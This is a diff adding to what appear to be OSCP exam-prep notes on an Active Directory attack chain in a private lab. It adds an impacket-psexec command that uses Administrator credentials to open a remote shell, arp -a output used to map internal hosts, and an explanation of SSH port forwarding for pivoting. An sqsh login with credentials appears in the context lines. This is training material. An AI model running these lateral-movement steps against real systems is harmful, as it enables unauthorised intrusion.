@@ -2138,6 +2138,35 @@ sqsh -S 127.0.0.1 -U oscp.exam\\sql_svc -P Dolphin1 -D msdb
 ````
 In this example we are 192.168.45.191 attacking an AD exploit chain with internal/private IPs. We are able to get sql_svc creds on MS01 which can be used to login into MS02, once we login we cannot download any files or do any rce's so we have to setup a bi-directional ssh tunnel.
 ````
+##### arp -a
+````
+ sudo impacket-psexec Administrator:December31@192.168.236.147 cmd.exe
+````
+````
+We are using the arp -a on MS01 to show where we got some of the IPs, internal and external facing when going through this exploit chain.
+````
+````
+C:\Windows\system32> arp -a
+ 
+Interface: 192.168.236.147 --- 0x6
+  Internet Address      Physical Address      Type   
+  192.168.236.254       00-50-56-bf-dd-5e     dynamic   
+  192.168.236.255       ff-ff-ff-ff-ff-ff     static    
+  224.0.0.22            01-00-5e-00-00-16     static    
+  224.0.0.251           01-00-5e-00-00-fb     static    
+  224.0.0.252           01-00-5e-00-00-fc     static    
+  239.255.255.250       01-00-5e-7f-ff-fa     static    
+
+Interface: 10.10.126.147 --- 0x8
+  Internet Address      Physical Address      Type
+  10.10.126.146         00-50-56-bf-27-a8     dynamic
+  10.10.126.148         00-50-56-bf-f9-55     dynamic
+  10.10.126.255         ff-ff-ff-ff-ff-ff     static    
+  224.0.0.22            01-00-5e-00-00-16     static    
+  224.0.0.251           01-00-5e-00-00-fb     static    
+  224.0.0.252           01-00-5e-00-00-fc     static    
+  239.255.255.250       01-00-5e-7f-ff-fa     static
+````
 ##### Local Port Foward
 ````
 Sets up local port forwarding. It instructs SSH to listen on port 1433 on the local machine and forward any incoming traffic to the destination IP address 10.10.126.148 on port 1433. Administrator@192.168.236.147: Specifies the username (Administrator) and the IP address (192.168.236.147) of the remote server to establish the SSH connection with.
